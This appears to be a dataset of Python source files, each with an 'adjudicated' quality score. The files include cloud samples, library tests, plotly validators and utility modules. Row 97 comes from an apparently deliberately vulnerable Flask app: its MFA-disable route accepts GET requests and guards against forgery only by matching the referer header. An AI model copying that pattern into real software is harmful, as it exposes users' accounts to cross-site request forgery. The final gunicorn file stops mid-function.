272	adjudicated	3	"#!/usr/bin/env python<<NEWL>>#<<NEWL>># Copyright 2020 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     https://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>>""""""Demo for receiving notifications.""""""<<NEWL>><<NEWL>><<NEWL>>def receive_notifications(project_id, subscription_name):<<NEWL>>    # [START securitycenter_receive_notifications]<<NEWL>>    # Requires https://cloud.google.com/pubsub/docs/quickstart-client-libraries#pubsub-client-libraries-python<<NEWL>>    import concurrent<<NEWL>><<NEWL>>    from google.cloud import pubsub_v1<<NEWL>>    from google.cloud.securitycenter_v1 import NotificationMessage<<NEWL>><<NEWL>>    # TODO: project_id = ""your-project-id""<<NEWL>>    # TODO: subscription_name = ""your-subscription-name""<<NEWL>><<NEWL>>    def callback(message):<<NEWL>><<NEWL>>        # Print the data received for debugging purpose if needed<<NEWL>>        print(f""Received message: {message.data}"")<<NEWL>><<NEWL>>        notification_msg = NotificationMessage.from_json(message.data)<<NEWL>><<NEWL>>        print(<<NEWL>>            ""Notification config name: {}"".format(<<NEWL>>                notification_msg.notification_config_name<<NEWL>>            )<<NEWL>>        )<<NEWL>>        print(""Finding: {}"".format(notification_msg.finding))<<NEWL>><<NEWL>>        # Ack the message to prevent it from being pulled again<<NEWL>>        message.ack()<<NEWL>><<NEWL>>    subscriber = pubsub_v1.SubscriberClient()<<NEWL>>    subscription_path = subscriber.subscription_path(project_id, subscription_name)<<NEWL>><<NEWL>>    streaming_pull_future = subscriber.subscribe(subscription_path, callback=callback)<<NEWL>><<NEWL>>    print(""Listening for messages on {}...\n"".format(subscription_path))<<NEWL>>    try:<<NEWL>>        streaming_pull_future.result(timeout=1)  # Block for 1 second<<NEWL>>    except concurrent.futures.TimeoutError:<<NEWL>>        streaming_pull_future.cancel()<<NEWL>>    # [END securitycenter_receive_notifications]<<NEWL>>    return True"
175	adjudicated	1	"""""""<<NEWL>>Tests that work on both the Python and C engines but do not have a<<NEWL>>specific classification into the other test modules.<<NEWL>>""""""<<NEWL>>import csv<<NEWL>>from io import StringIO<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>from pandas import DataFrame<<NEWL>>import pandas._testing as tm<<NEWL>><<NEWL>>from pandas.io.parsers import TextParser<<NEWL>><<NEWL>>xfail_pyarrow = pytest.mark.usefixtures(""pyarrow_xfail"")<<NEWL>><<NEWL>><<NEWL>>@xfail_pyarrow<<NEWL>>def test_read_data_list(all_parsers):<<NEWL>>    parser = all_parsers<<NEWL>>    kwargs = {""index_col"": 0}<<NEWL>>    data = ""A,B,C\nfoo,1,2,3\nbar,4,5,6""<<NEWL>><<NEWL>>    data_list = [[""A"", ""B"", ""C""], [""foo"", ""1"", ""2"", ""3""], [""bar"", ""4"", ""5"", ""6""]]<<NEWL>>    expected = parser.read_csv(StringIO(data), **kwargs)<<NEWL>><<NEWL>>    with TextParser(data_list, chunksize=2, **kwargs) as parser:<<NEWL>>        result = parser.read()<<NEWL>><<NEWL>>    tm.assert_frame_equal(result, expected)<<NEWL>><<NEWL>><<NEWL>>def test_reader_list(all_parsers):<<NEWL>>    data = """"""index,A,B,C,D<<NEWL>>foo,2,3,4,5<<NEWL>>bar,7,8,9,10<<NEWL>>baz,12,13,14,15<<NEWL>>qux,12,13,14,15<<NEWL>>foo2,12,13,14,15<<NEWL>>bar2,12,13,14,15<<NEWL>>""""""<<NEWL>>    parser = all_parsers<<NEWL>>    kwargs = {""index_col"": 0}<<NEWL>><<NEWL>>    lines = list(csv.reader(StringIO(data)))<<NEWL>>    with TextParser(lines, chunksize=2, **kwargs) as reader:<<NEWL>>        chunks = list(reader)<<NEWL>><<NEWL>>    expected = parser.read_csv(StringIO(data), **kwargs)<<NEWL>><<NEWL>>    tm.assert_frame_equal(chunks[0], expected[:2])<<NEWL>>    tm.assert_frame_equal(chunks[1], expected[2:4])<<NEWL>>    tm.assert_frame_equal(chunks[2], expected[4:])<<NEWL>><<NEWL>><<NEWL>>def test_reader_list_skiprows(all_parsers):<<NEWL>>    data = """"""index,A,B,C,D<<NEWL>>foo,2,3,4,5<<NEWL>>bar,7,8,9,10<<NEWL>>baz,12,13,14,15<<NEWL>>qux,12,13,14,15<<NEWL>>foo2,12,13,14,15<<NEWL>>bar2,12,13,14,15<<NEWL>>""""""<<NEWL>>    parser = all_parsers<<NEWL>>    kwargs = {""index_col"": 0}<<NEWL>><<NEWL>>    lines = list(csv.reader(StringIO(data)))<<NEWL>>    with TextParser(lines, chunksize=2, skiprows=[1], **kwargs) as reader:<<NEWL>>        chunks = list(reader)<<NEWL>><<NEWL>>    expected = parser.read_csv(StringIO(data), **kwargs)<<NEWL>><<NEWL>>    tm.assert_frame_equal(chunks[0], expected[1:3])<<NEWL>><<NEWL>><<NEWL>>def test_read_csv_parse_simple_list(all_parsers):<<NEWL>>    parser = all_parsers<<NEWL>>    data = """"""foo<<NEWL>>bar baz<<NEWL>>qux foo<<NEWL>>foo<<NEWL>>bar""""""<<NEWL>><<NEWL>>    result = parser.read_csv(StringIO(data), header=None)<<NEWL>>    expected = DataFrame([""foo"", ""bar baz"", ""qux foo"", ""foo"", ""bar""])<<NEWL>>    tm.assert_frame_equal(result, expected)"
35	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""hoverlabel"", parent_name=""cone"", **kwargs):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
124	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class CumulativeValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""cumulative"", parent_name=""histogram"", **kwargs):<<NEWL>>        super(CumulativeValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Cumulative""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            currentbin<<NEWL>>                Only applies if cumulative is enabled. Sets<<NEWL>>                whether the current bin is included, excluded,<<NEWL>>                or has half of its value included in the<<NEWL>>                current cumulative value. ""include"" is the<<NEWL>>                default for compatibility with various other<<NEWL>>                tools, however it introduces a half-bin bias to<<NEWL>>                the results. ""exclude"" makes the opposite half-<<NEWL>>                bin bias, and ""half"" removes it.<<NEWL>>            direction<<NEWL>>                Only applies if cumulative is enabled. If<<NEWL>>                ""increasing"" (default) we sum all prior bins,<<NEWL>>                so the result increases from left to right. If<<NEWL>>                ""decreasing"" we sum later bins so the result<<NEWL>>                decreases from left to right.<<NEWL>>            enabled<<NEWL>>                If true, display the cumulative distribution by<<NEWL>>                summing the binned values. Use the `direction`<<NEWL>>                and `centralbin` attributes to tune the<<NEWL>>                accumulation method. Note: in this mode, the<<NEWL>>                ""density"" `histnorm` settings behave the same<<NEWL>>                as their equivalents without ""density"": """" and<<NEWL>>                ""density"" both rise to the number of data<<NEWL>>                points, and ""probability"" and *probability<<NEWL>>                density* both rise to the number of sample<<NEWL>>                points.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
64	adjudicated	0	"import unittest<<NEWL>><<NEWL>>from Cython import StringIOTree as stringtree<<NEWL>><<NEWL>>code = """"""<<NEWL>>cdef int spam                   # line 1<<NEWL>><<NEWL>>cdef ham():<<NEWL>>    a = 1<<NEWL>>    b = 2<<NEWL>>    c = 3<<NEWL>>    d = 4<<NEWL>><<NEWL>>def eggs():<<NEWL>>    pass<<NEWL>><<NEWL>>cpdef bacon():<<NEWL>>    print spam<<NEWL>>    print 'scotch'<<NEWL>>    print 'tea?'<<NEWL>>    print 'or coffee?'          # line 16<<NEWL>>""""""<<NEWL>><<NEWL>>linemap = dict(enumerate(code.splitlines()))<<NEWL>><<NEWL>>class TestStringIOTree(unittest.TestCase):<<NEWL>><<NEWL>>    def setUp(self):<<NEWL>>        self.tree = stringtree.StringIOTree()<<NEWL>><<NEWL>>    def test_markers(self):<<NEWL>>        assert not self.tree.allmarkers()<<NEWL>><<NEWL>>    def test_insertion(self):<<NEWL>>        self.write_lines((1, 2, 3))<<NEWL>>        line_4_to_6_insertion_point = self.tree.insertion_point()<<NEWL>>        self.write_lines((7, 8))<<NEWL>>        line_9_to_13_insertion_point = self.tree.insertion_point()<<NEWL>>        self.write_lines((14, 15, 16))<<NEWL>><<NEWL>>        line_4_insertion_point = line_4_to_6_insertion_point.insertion_point()<<NEWL>>        self.write_lines((5, 6), tree=line_4_to_6_insertion_point)<<NEWL>><<NEWL>>        line_9_to_12_insertion_point = (<<NEWL>>            line_9_to_13_insertion_point.insertion_point())<<NEWL>>        self.write_line(13, tree=line_9_to_13_insertion_point)<<NEWL>><<NEWL>>        self.write_line(4, tree=line_4_insertion_point)<<NEWL>>        self.write_line(9, tree=line_9_to_12_insertion_point)<<NEWL>>        line_10_insertion_point = line_9_to_12_insertion_point.insertion_point()<<NEWL>>        self.write_line(11, tree=line_9_to_12_insertion_point)<<NEWL>>        self.write_line(10, tree=line_10_insertion_point)<<NEWL>>        self.write_line(12, tree=line_9_to_12_insertion_point)<<NEWL>><<NEWL>>        self.assertEqual(self.tree.allmarkers(), list(range(1, 17)))<<NEWL>>        self.assertEqual(code.strip(), self.tree.getvalue().strip())<<NEWL>><<NEWL>><<NEWL>>    def write_lines(self, linenos, tree=None):<<NEWL>>        for lineno in linenos:<<NEWL>>            self.write_line(lineno, tree=tree)<<NEWL>><<NEWL>>    def write_line(self, lineno, tree=None):<<NEWL>>        if tree is None:<<NEWL>>            tree = self.tree<<NEWL>>        tree.markers.append(lineno)<<NEWL>>        tree.write(linemap[lineno] + '\n')"
246	adjudicated	2	"# Copyright 2020 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     https://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>># [START job_search_autocomplete_job_title]<<NEWL>><<NEWL>>from google.cloud import talent_v4beta1<<NEWL>>import six<<NEWL>><<NEWL>><<NEWL>>def complete_query(project_id, tenant_id, query):<<NEWL>>    """"""Complete job title given partial text (autocomplete)""""""<<NEWL>><<NEWL>>    client = talent_v4beta1.CompletionClient()<<NEWL>><<NEWL>>    # project_id = 'Your Google Cloud Project ID'<<NEWL>>    # tenant_id = 'Your Tenant ID (using tenancy is optional)'<<NEWL>>    # query = '[partially typed job title]'<<NEWL>><<NEWL>>    if isinstance(project_id, six.binary_type):<<NEWL>>        project_id = project_id.decode(""utf-8"")<<NEWL>>    if isinstance(tenant_id, six.binary_type):<<NEWL>>        tenant_id = tenant_id.decode(""utf-8"")<<NEWL>>    if isinstance(query, six.binary_type):<<NEWL>>        query = query.decode(""utf-8"")<<NEWL>><<NEWL>>    parent = f""projects/{project_id}/tenants/{tenant_id}""<<NEWL>><<NEWL>>    request = talent_v4beta1.CompleteQueryRequest(<<NEWL>>        parent=parent,<<NEWL>>        query=query,<<NEWL>>        page_size=5,  # limit for number of results<<NEWL>>        language_codes=[""en-US""],  # language code<<NEWL>>    )<<NEWL>>    response = client.complete_query(request=request)<<NEWL>>    for result in response.completion_results:<<NEWL>>        print(f""Suggested title: {result.suggestion}"")<<NEWL>>        # Suggestion type is JOB_TITLE or COMPANY_TITLE<<NEWL>>        print(<<NEWL>>            f""Suggestion type: {talent_v4beta1.CompleteQueryRequest.CompletionType(result.type_).name}""<<NEWL>>        )<<NEWL>><<NEWL>><<NEWL>># [END job_search_autocomplete_job_title]"
97	adjudicated	0	"import sqlite3<<NEWL>>from flask import Blueprint, render_template, redirect, request, g, session, make_response, flash<<NEWL>>import libuser<<NEWL>>import libsession<<NEWL>>import libmfa<<NEWL>>import pyotp<<NEWL>>import qrcode<<NEWL>>import base64<<NEWL>>from io import BytesIO<<NEWL>><<NEWL>><<NEWL>>mod_mfa = Blueprint('mod_mfa', __name__, template_folder='templates')<<NEWL>><<NEWL>><<NEWL>>@mod_mfa.route('/', methods=['GET'])<<NEWL>>def do_mfa_view():<<NEWL>><<NEWL>>    if 'username' not in g.session:<<NEWL>>        return redirect('/user/login')<<NEWL>><<NEWL>>    if libmfa.mfa_is_enabled(g.session['username']):<<NEWL>>        return render_template('mfa.disable.html')<<NEWL>>    else:<<NEWL>>        libmfa.mfa_reset_secret(g.session['username'])<<NEWL>>        secret = libmfa.mfa_get_secret(g.session['username'])<<NEWL>>        secret_url = pyotp.totp.TOTP(secret).provisioning_uri(g.session['username'], issuer_name=""Vulpy"")<<NEWL>>        img = qrcode.make(secret_url)<<NEWL>><<NEWL>>        buffered = BytesIO()<<NEWL>>        img.save(buffered, format=""PNG"")<<NEWL>>        img_str = base64.b64encode(buffered.getvalue()).decode()<<NEWL>><<NEWL>>        return render_template('mfa.enable.html', secret_url=secret_url, img_str=img_str)<<NEWL>><<NEWL>><<NEWL>>@mod_mfa.route('/', methods=['POST'])<<NEWL>>def do_mfa_enable():<<NEWL>><<NEWL>>    if 'username' not in g.session:<<NEWL>>        return redirect('/user/login')<<NEWL>><<NEWL>>    secret = libmfa.mfa_get_secret(g.session['username'])<<NEWL>><<NEWL>>    otp = request.form.get('otp')<<NEWL>><<NEWL>>    totp = pyotp.TOTP(secret)<<NEWL>><<NEWL>>    if totp.verify(otp):<<NEWL>>        libmfa.mfa_enable(g.session['username'])<<NEWL>>        return redirect('/mfa/')<<NEWL>>    else:<<NEWL>>        flash(""The OTP was incorrect"")<<NEWL>>        return redirect('/mfa/')<<NEWL>><<NEWL>>    return render_template('mfa.enable.html')<<NEWL>><<NEWL>><<NEWL>>@mod_mfa.route('/disable', methods=['GET'])<<NEWL>>def do_mfa_disable():<<NEWL>><<NEWL>>    if 'username' not in g.session:<<NEWL>>        return redirect('/user/login')<<NEWL>><<NEWL>>    if 'referer' not in request.headers or request.headers['referer'] != 'vulpy.com':<<NEWL>>        return redirect('/user/login')<<NEWL>><<NEWL>>    libmfa.mfa_disable(g.session['username'])<<NEWL>>    return redirect('/mfa/')<<NEWL>>"
306	adjudicated	2	"from . import engines<<NEWL>>from .exceptions import TemplateDoesNotExist<<NEWL>><<NEWL>><<NEWL>>def get_template(template_name, using=None):<<NEWL>>    """"""<<NEWL>>    Load and return a template for the given name.<<NEWL>><<NEWL>>    Raise TemplateDoesNotExist if no such template exists.<<NEWL>>    """"""<<NEWL>>    chain = []<<NEWL>>    engines = _engine_list(using)<<NEWL>>    for engine in engines:<<NEWL>>        try:<<NEWL>>            return engine.get_template(template_name)<<NEWL>>        except TemplateDoesNotExist as e:<<NEWL>>            chain.append(e)<<NEWL>><<NEWL>>    raise TemplateDoesNotExist(template_name, chain=chain)<<NEWL>><<NEWL>><<NEWL>>def select_template(template_name_list, using=None):<<NEWL>>    """"""<<NEWL>>    Load and return a template for one of the given names.<<NEWL>><<NEWL>>    Try names in order and return the first template found.<<NEWL>><<NEWL>>    Raise TemplateDoesNotExist if no such template exists.<<NEWL>>    """"""<<NEWL>>    if isinstance(template_name_list, str):<<NEWL>>        raise TypeError(<<NEWL>>            ""select_template() takes an iterable of template names but got a ""<<NEWL>>            ""string: %r. Use get_template() if you want to load a single ""<<NEWL>>            ""template by name."" % template_name_list<<NEWL>>        )<<NEWL>><<NEWL>>    chain = []<<NEWL>>    engines = _engine_list(using)<<NEWL>>    for template_name in template_name_list:<<NEWL>>        for engine in engines:<<NEWL>>            try:<<NEWL>>                return engine.get_template(template_name)<<NEWL>>            except TemplateDoesNotExist as e:<<NEWL>>                chain.append(e)<<NEWL>><<NEWL>>    if template_name_list:<<NEWL>>        raise TemplateDoesNotExist("", "".join(template_name_list), chain=chain)<<NEWL>>    else:<<NEWL>>        raise TemplateDoesNotExist(""No template names provided"")<<NEWL>><<NEWL>><<NEWL>>def render_to_string(template_name, context=None, request=None, using=None):<<NEWL>>    """"""<<NEWL>>    Load a template and render it with a context. Return a string.<<NEWL>><<NEWL>>    template_name may be a string or a list of strings.<<NEWL>>    """"""<<NEWL>>    if isinstance(template_name, (list, tuple)):<<NEWL>>        template = select_template(template_name, using=using)<<NEWL>>    else:<<NEWL>>        template = get_template(template_name, using=using)<<NEWL>>    return template.render(context, request)<<NEWL>><<NEWL>><<NEWL>>def _engine_list(using=None):<<NEWL>>    return engines.all() if using is None else [engines[using]]"
186	adjudicated	4	"import functools<<NEWL>>import logging<<NEWL>>import re<<NEWL>>from typing import NewType, Optional, Tuple, cast<<NEWL>><<NEWL>>from pip._vendor.packaging import specifiers, version<<NEWL>>from pip._vendor.packaging.requirements import Requirement<<NEWL>><<NEWL>>NormalizedExtra = NewType(""NormalizedExtra"", str)<<NEWL>><<NEWL>>logger = logging.getLogger(__name__)<<NEWL>><<NEWL>><<NEWL>>def check_requires_python(<<NEWL>>    requires_python: Optional[str], version_info: Tuple[int, ...]<<NEWL>>) -> bool:<<NEWL>>    """"""<<NEWL>>    Check if the given Python version matches a ""Requires-Python"" specifier.<<NEWL>><<NEWL>>    :param version_info: A 3-tuple of ints representing a Python<<NEWL>>        major-minor-micro version to check (e.g. `sys.version_info[:3]`).<<NEWL>><<NEWL>>    :return: `True` if the given Python version satisfies the requirement.<<NEWL>>        Otherwise, return `False`.<<NEWL>><<NEWL>>    :raises InvalidSpecifier: If `requires_python` has an invalid format.<<NEWL>>    """"""<<NEWL>>    if requires_python is None:<<NEWL>>        # The package provides no information<<NEWL>>        return True<<NEWL>>    requires_python_specifier = specifiers.SpecifierSet(requires_python)<<NEWL>><<NEWL>>    python_version = version.parse(""."".join(map(str, version_info)))<<NEWL>>    return python_version in requires_python_specifier<<NEWL>><<NEWL>><<NEWL>>@functools.lru_cache(maxsize=512)<<NEWL>>def get_requirement(req_string: str) -> Requirement:<<NEWL>>    """"""Construct a packaging.Requirement object with caching""""""<<NEWL>>    # Parsing requirement strings is expensive, and is also expected to happen<<NEWL>>    # with a low diversity of different arguments (at least relative the number<<NEWL>>    # constructed). This method adds a cache to requirement object creation to<<NEWL>>    # minimize repeated parsing of the same string to construct equivalent<<NEWL>>    # Requirement objects.<<NEWL>>    return Requirement(req_string)<<NEWL>><<NEWL>><<NEWL>>def safe_extra(extra: str) -> NormalizedExtra:<<NEWL>>    """"""Convert an arbitrary string to a standard 'extra' name<<NEWL>><<NEWL>>    Any runs of non-alphanumeric characters are replaced with a single '_',<<NEWL>>    and the result is always lowercased.<<NEWL>><<NEWL>>    This function is duplicated from ``pkg_resources``. Note that this is not<<NEWL>>    the same to either ``canonicalize_name`` or ``_egg_link_name``.<<NEWL>>    """"""<<NEWL>>    return cast(NormalizedExtra, re.sub(""[^A-Za-z0-9.-]+"", ""_"", extra).lower())"
357	adjudicated	0	from typing import List<<NEWL>>from collections import deque<<NEWL>><<NEWL>>class Solution:<<NEWL>>    def maxAreaofIsland(self, grid: List[List[int]]) -> int:<<NEWL>>        row = len(grid)<<NEWL>>        col = len(grid[0])<<NEWL>>        biggest_island = 0<<NEWL>>        visited = [[False for i in range(col)] for j in range(row)]<<NEWL>>        for i in range(row):<<NEWL>>            for j in range(col):<<NEWL>>                if grid[i][j] == 1 and visited[i][j] is False:<<NEWL>>                    island_area = self.visitIsland(grid, visited, i,j)<<NEWL>>                    biggest_island = max(island_area,biggest_island)<<NEWL>>        return biggest_island<<NEWL>><<NEWL>>    def visitIsland(self, grid: List[List[int]], visited: List[List[int]], i: int, j: int) -> int:<<NEWL>>        neighbours = deque([(i,j)])<<NEWL>>        area = 0<<NEWL>>        while neighbours:<<NEWL>>            row,col = neighbours.popleft()<<NEWL>>            if row < 0 or row >= len(grid) or col < 0 or col >= len(grid[0]):<<NEWL>>                continue<<NEWL>>            if visited[row][col] is False and grid[row][col] == 1:<<NEWL>>                visited[row][col] = True<<NEWL>>                area += 1<<NEWL>>                neighbours.extend([(row + 1,col)])<<NEWL>>                neighbours.extend([(row - 1, col)])<<NEWL>>                neighbours.extend([(row, col + 1)])<<NEWL>>                neighbours.extend([(row, col - 1)])<<NEWL>>        return area<<NEWL>><<NEWL>>if __name__ == '__main__':<<NEWL>>    solution = Solution()<<NEWL>>    case1 = [[0,0,0,0,0,0,0,0]]<<NEWL>>    assert solution.maxAreaofIsland(case1) == 0<<NEWL>><<NEWL>>    case2 = [[0,0,1,0,0,0,0,1,0,0,0,0,0],[0,0,0,0,0,0,0,1,1,1,0,0,0],[0,1,1,0,1,0,0,0,0,0,0,0,0],[0,1,0,0,1,1,0,0,1,0,1,0,0],<<NEWL>>             [0,1,0,0,1,1,0,0,1,1,1,0,0],[0,0,0,0,0,0,0,0,0,0,1,0,0],[0,0,0,0,0,0,0,1,1,1,0,0,0],[0,0,0,0,0,0,0,1,1,0,0,0,0]]<<NEWL>>    assert solution.maxAreaofIsland(case2) == 6<<NEWL>><<NEWL>>    case3 = [[1, 1, 1, 0, 0], [0, 1, 0, 0, 1], [0, 0, 1, 1, 0], [0, 1, 1, 0, 0], [0, 0, 1, 0, 0]]<<NEWL>><<NEWL>>    assert solution.maxAreaofIsland(case3) == 5
419	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class InsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""insidetextfont"", parent_name=""pie"", **kwargs):<<NEWL>>        super(InsidetextfontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Insidetextfont""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
508	adjudicated	1	"#<<NEWL>># Copyright 2018 the original author or authors.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>>#<<NEWL>>from google.protobuf.json_format import MessageToDict<<NEWL>>from google.protobuf.message import Message<<NEWL>>from simplejson import dumps<<NEWL>>from common.event_bus import EventBusClient<<NEWL>>from voltha.protos.omci_mib_db_pb2 import OpenOmciEvent<<NEWL>>from voltha.protos.omci_alarm_db_pb2 import AlarmOpenOmciEvent<<NEWL>>from common.utils.json_format import MessageToDict<<NEWL>><<NEWL>><<NEWL>>class OpenOmciEventBus(object):<<NEWL>>    """""" Event bus for publishing OpenOMCI related events. """"""<<NEWL>>    __slots__ = (<<NEWL>>        '_event_bus_client',  # The event bus client used to publish events.<<NEWL>>        '_topic'              # the topic to publish to<<NEWL>>    )<<NEWL>><<NEWL>>    def __init__(self):<<NEWL>>        self._event_bus_client = EventBusClient()<<NEWL>>        self._topic = 'openomci-events'<<NEWL>><<NEWL>>    def message_to_dict(m):<<NEWL>>        return MessageToDict(m, True, True, False)<<NEWL>><<NEWL>>    def advertise(self, event_type, data):<<NEWL>>        if isinstance(data, Message):<<NEWL>>            msg = dumps(MessageToDict(data, True, True))<<NEWL>>        elif isinstance(data, dict):<<NEWL>>            msg = dumps(data)<<NEWL>>        else:<<NEWL>>            msg = str(data)<<NEWL>><<NEWL>>        event_func = AlarmOpenOmciEvent if 'AlarmSynchronizer' in msg \<<NEWL>>                                  else OpenOmciEvent<<NEWL>>        event = event_func(<<NEWL>>                type=event_type,<<NEWL>>                data=msg<<NEWL>>        )<<NEWL>><<NEWL>>        self._event_bus_client.publish(self._topic, event)"
448	adjudicated	1	"# -*- coding: utf-8 -<<NEWL>>#<<NEWL>># This file is part of gunicorn released under the MIT license.<<NEWL>># See the NOTICE for more information.<<NEWL>><<NEWL>>import os<<NEWL>><<NEWL>>from gunicorn.errors import ConfigError<<NEWL>>from gunicorn.app.base import Application<<NEWL>>from gunicorn import util<<NEWL>><<NEWL>><<NEWL>>class WSGIApplication(Application):<<NEWL>>    def init(self, parser, opts, args):<<NEWL>>        self.app_uri = None<<NEWL>><<NEWL>>        if opts.paste:<<NEWL>>            from .pasterapp import has_logging_config<<NEWL>><<NEWL>>            config_uri = os.path.abspath(opts.paste)<<NEWL>>            config_file = config_uri.split('#')[0]<<NEWL>><<NEWL>>            if not os.path.exists(config_file):<<NEWL>>                raise ConfigError(""%r not found"" % config_file)<<NEWL>><<NEWL>>            self.cfg.set(""default_proc_name"", config_file)<<NEWL>>            self.app_uri = config_uri<<NEWL>><<NEWL>>            if has_logging_config(config_file):<<NEWL>>                self.cfg.set(""logconfig"", config_file)<<NEWL>><<NEWL>>            return<<NEWL>><<NEWL>>        if len(args) > 0:<<NEWL>>            self.cfg.set(""default_proc_name"", args[0])<<NEWL>>            self.app_uri = args[0]<<NEWL>><<NEWL>>    def load_config(self):<<NEWL>>        super().load_config()<<NEWL>><<NEWL>>        if self.app_uri is None:<<NEWL>>            if self.cfg.wsgi_app is not None:<<NEWL>>                self.app_uri = self.cfg.wsgi_app<<NEWL>>            else:<<NEWL>>                raise ConfigError(""No application module specified."")<<NEWL>><<NEWL>>    def load_wsgiapp(self):<<NEWL>>        return util.import_app(self.app_uri)<<NEWL>><<NEWL>>    def load_pasteapp(self):<<NEWL>>        from .pasterapp import get_wsgi_app<<NEWL>>        return get_wsgi_app(self.app_uri, defaults=self.cfg.paste_global_conf)<<NEWL>><<NEWL>>    def load(self):<<NEWL>>        if self.cfg.paste is not None:<<NEWL>>            return self.load_pasteapp()<<NEWL>>        else:<<NEWL>>            return self.load_wsgiapp()<<NEWL>><<NEWL>><<NEWL>>def run():<<NEWL>>    